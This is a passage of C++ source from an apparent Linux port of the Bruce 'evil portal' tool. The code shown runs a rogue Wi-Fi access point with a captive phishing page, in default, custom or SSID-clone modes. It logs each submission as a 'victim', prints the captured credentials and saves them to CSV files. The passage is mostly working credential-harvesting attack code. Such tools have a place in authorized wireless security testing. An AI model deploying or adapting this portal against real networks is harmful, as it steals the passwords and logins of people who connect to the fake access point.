        ::bind(listen_fd, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) != 0 ||
        ::listen(listen_fd, 16) != 0) {
        std::printf("error: cannot listen on %s:80: %s\n", opts.gateway.c_str(),
                    std::strerror(errno));
        if (errno == EACCES) {
            // Binding :80 as a normal user is the classic "the portal ran
            // without the sudo self-escalation" symptom.
            std::printf("port 80 is privileged: the portal must run as root. The GUI normally\n"
                        "self-escalates via `sudo -n`, which needs the sudoers rule\n"
                        "(/etc/sudoers.d/bruce-cardputerzero; see INSTALL.md 'A tool needs root').\n"
                        "Quick check on the device: `sudo -n true` must not ask for a password.\n");
        }
        return 1;
    }

    // SIGTERM breaks the accept() below (see on_signal).
    g_listen_fd = listen_fd;
    struct sigaction sa{};
    sa.sa_handler = on_signal;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0; // no SA_RESTART: accept() must return EINTR
    sigaction(SIGTERM, &sa, nullptr);
    sigaction(SIGINT, &sa, nullptr);
    std::signal(SIGPIPE, SIG_IGN);

    const std::string creds_path =
        opts.creds_dir + "/BruceEvilCreds/" +
        (opts.verify_mode ? opts.ap_name + "_creds.csv" : opts.output_file);
    std::printf("EVIL PORTAL\n");
    std::printf("AP: '%s' (channel %d on %s)\n", opts.ap_name.c_str(), opts.channel, iface.c_str());
    std::printf("-> http://%s/creds\n", opts.gateway.c_str());
    std::printf("-> http://%s/ssid\n", opts.gateway.c_str());
    std::printf("Victims: 0\n");
    std::printf("captures -> %s\n", creds_path.c_str());
    std::printf("Back / Ctrl-C to stop.\n\n");
    std::fflush(stdout);

    while (!g_stop) {
        sockaddr_in peer{};
        socklen_t peer_len = sizeof(peer);
        const int conn = ::accept(listen_fd, reinterpret_cast<sockaddr*>(&peer), &peer_len);
        if (conn < 0) {
            if (errno == EINTR) break; // signal arrived (shutdown)
            continue;
        }
        timeval tv{10, 0}; // slowloris / stuck clients just time out
        setsockopt(conn, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(conn, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        std::string raw;
        char buf[2048];
        size_t header_end = std::string::npos;
        while (raw.size() < 16384) {
            const ssize_t n = ::recv(conn, buf, sizeof(buf), 0);
            if (n <= 0) break;
            raw.append(buf, static_cast<size_t>(n));
            header_end = raw.find("\r\n\r\n");
            if (header_end == std::string::npos) continue;
            size_t content_length = 0;
            // honor Content-Length so urlencoded POST bodies are complete
            size_t p = raw.find("Content-Length:");
            if (p == std::string::npos || p > header_end) p = raw.find("content-length:");
            if (p != std::string::npos && p < header_end) {
                content_length = static_cast<size_t>(
                    strtoul(raw.c_str() + p + sizeof("Content-Length:") - 1, nullptr, 10));
            }
            if (raw.size() >= header_end + 4 + std::min<size_t>(content_length, 8192)) break;
        }

        const HttpRequest req = parse_http_request(raw);
        const int before = state.victims;
        const HttpResponse resp = portal_handle_request(req, opts, state, hooks);

        std::string out = "HTTP/1.1 " + std::to_string(resp.status) +
                          " OK\r\nContent-Type: text/html\r\nConnection: close\r\nContent-Length: " +
                          std::to_string(resp.body.size()) + "\r\n\r\n" + resp.body;
        ::send(conn, out.data(), out.size(), 0);
        ::close(conn);

        if (state.victims == before + 1) {
            std::printf("[victim #%d] %s", state.victims,
                        state.last_cred.empty() ? "(empty submission)\n" : state.last_cred.c_str());
            std::printf("Victims: %d\n\n", state.victims);
            std::fflush(stdout);
        } else if (req.path == "/postssid" && !arg_value(req, "ssid").empty()) {
            // Counter reset by the SSID change; the hook already announced it.
            std::printf("Victims: %d\n\n", state.victims);
            std::fflush(stdout);
        }
    }

    ::close(listen_fd);
    g_listen_fd = -1;
    stop_ap_services();
    run("systemctl start NetworkManager 2>/dev/null");
    // The on-log counter resets on /postssid (Bruce restartWiFi(reset=true));
    // the CSV keeps the full history, so summarize from the file.
    int captured = 0;
    {
        std::ifstream f(creds_path);
        std::string line;
        while (std::getline(f, line)) {
            if (!line.empty()) ++captured;
        }
    }
    std::printf("\nStopped. %d credential(s) in %s\n", captured, creds_path.c_str());
    return 0;
}

} // namespace

int evil_portal_main(int argc, char** argv) {
    if (argc < 1 || !argv[0] || !argv[0][0]) {
        usage();
        return 1;
    }
    const std::string mode = argv[0];

    PortalOptions opts;
    opts.html_page = default_portal_html();
    opts.creds_dir = home_dir() + "/.bruce";
    std::string iface = autodetect_iface();
    std::string custom_file;

    std::vector<std::string> pos;
    for (int i = 1; i < argc; ++i) {
        const std::string a = argv[i] ? argv[i] : "";
        if (a == "--gateway" && i + 1 < argc) {
            opts.gateway = argv[++i];
        } else if (a == "--iface" && i + 1 < argc) {
            iface = argv[++i];
        } else if (a == "--channel" && i + 1 < argc) {
            opts.channel = parse_int(argv[++i], opts.channel);
        } else if (a.rfind("--", 0) == 0) {
            std::printf("error: unknown option %s\n", a.c_str());
            usage();
            return 1;
        } else {
            pos.push_back(a);
        }
    }
    if (!valid_iface(iface) || !valid_ip(opts.gateway)) {
        std::printf("error: bad interface '%s' or gateway '%s'\n", iface.c_str(),
                    opts.gateway.c_str());
        return 1;
    }

    if (mode == "verify") {
        opts.verify_mode = true;
        opts.html_page = verify_portal_html();
        opts.output_file = "default_creds_1.csv"; // loadDefaultHtml_one()
    } else if (mode == "custom") {
        if (pos.empty()) {
            std::printf("error: custom mode needs an HTML file path\n");
            return 1;
        }
        custom_file = pos[0];
        pos.erase(pos.begin());
    } else if (mode != "default" && mode != "clone") {
        usage();
        return 1;
    }

    // Positional args: default/verify [ssid], custom <file> [ssid],
    // clone <ssid> [channel]. A custom file's <!-- AP="..." --> tag still
    // wins over the SSID arg, like Bruce's loadCustomHtml.
    if (!pos.empty()) {
        if (mode == "clone") {
            opts.ap_name = pos[0];
            if (pos.size() > 1) opts.channel = parse_int(pos[1].c_str(), opts.channel);
        } else {
            opts.ap_name = pos[0];
        }
    }

    if (mode == "clone") {
        opts.output_file = "default_creds.csv"; // clone serves the default page
    }

    if (mode == "custom") {
        // The catalog passes "~"-paths (execvp never expands them).
        if (starts_with(custom_file, "~/")) {
            custom_file = home_dir() + custom_file.substr(1);
        }
        if (!file_exists(custom_file)) {
            std::printf("error: %s not found.\n", custom_file.c_str());
            std::printf("Put your portal HTML there; a first line like <!-- AP=\"Free Wifi\" -->\n"
                        "names the access point (same as Bruce's Custom Html on the ESP32).\n");
            return 1;
        }
    }

    if (geteuid() != 0) {
        std::printf("error: evil portal needs root (hostapd, dnsmasq, port 80). "
                    "Run the app with sudo.\n");
        return 1;
    }

    if (mode == "custom") {
        std::string html;
        read_file(custom_file, html);
        const std::string ap = parse_ap_tag(html);
        if (!ap.empty()) opts.ap_name = ap; // loadCustomHtml(): the file tag wins
        opts.html_page = html;
        // Bruce: <basename>.html -> <basename>_creds.csv
        std::string base = custom_file;
        const size_t slash = base.find_last_of('/');
        if (slash != std::string::npos) base = base.substr(slash + 1);
        const size_t dot = base.rfind(".html");
        if (dot != std::string::npos && dot + 5 == base.size()) base = base.substr(0, dot);
        opts.output_file = base + "_creds.csv";
    }

    run("rm -rf " + std::string(kWorkDir));
    run("mkdir -p " + std::string(kWorkDir));
    return serve_portal(std::move(opts), iface);
}

#else // !__linux__

int evil_portal_main(int, char**) {
    std::printf("evil portal is only available on Linux builds.\n");
    return 1;
}

#endif // __linux__

} // namespace platform
